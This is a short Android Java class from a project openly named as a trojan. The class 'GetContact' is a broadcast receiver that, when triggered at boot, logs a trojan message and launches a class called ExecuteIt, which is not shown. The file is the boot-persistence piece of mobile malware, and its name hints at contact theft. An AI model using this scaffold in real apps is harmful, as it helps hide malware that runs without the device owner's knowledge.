package com.example.mytrojan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class GetContact extends BroadcastReceiver {
    public GetContact() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("GET_CONTACT", "TROJAN RECEIVED BOOT_COMPLETE");
        new ExecuteIt();
    }
}
